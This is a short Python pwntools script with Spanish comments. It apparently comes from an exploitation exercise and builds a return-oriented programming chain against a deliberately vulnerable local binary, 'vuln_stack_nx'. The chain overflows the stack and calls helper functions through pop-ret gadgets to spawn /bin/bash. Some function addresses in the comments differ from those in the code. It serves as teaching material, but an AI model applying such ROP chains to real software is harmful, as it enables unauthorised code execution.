#!/usr/bin/python
# coding: utf-8


# Prueba de ropping para el ejecutable vuln1_stack. 
# 	Ejecuta de forma encadenada las funciones add_bin, add_bash y exec_string: 
# 	add_bin: 	  0x80493af  (parametros 0xdeadbeef)
# 	add_bash: 	  0x08049410 (parametros: 0xcafebabe, 0x0badf00d)
# 	exec_string:  0x08049398
# 	 
# 	Para encontrar gadgets para encadenar: 
# 	 	~/rop-tool/rop-tool gadget vuln_stack_nx 
# 	Encuentro un gadget: 0x080494bd: add esp, 0xc; pop ebx; pop esi; pop edi; pop ebp; ret; 
#		Para hallar las direcciones: (gdb) x/8i 0x080494bd 		
#		pop ret: 0x080494c3
# 		pop pop ret: 0x080494c2 
# 	
# Para probarlo: ejecutar primero sh para ver que despues arranca el /bin/bash. 
# Ejecutar despues: ./rop.py
	
from pwn import * 

# Definición de direcciones. 

add_bin = 	0x80493af
add_bash = 	0x80493fc
exec_string = 	0x8049373
pop_ret = 	0x0804901e
pop_pop_ret = 	0x080493f9


p = ''
p += 'A' * 500
p += 'B' * 16
p += p32(add_bin)
p += p32(pop_ret)
p += p32(0xdeadbeef)
p += p32(add_bash)
p += p32(pop_pop_ret)
p += p32(0xcafebabe)
p += p32(0x0badf00d)
p += p32(exec_string)

proc = process(['./vuln_stack_nx', p])
proc.interactive()



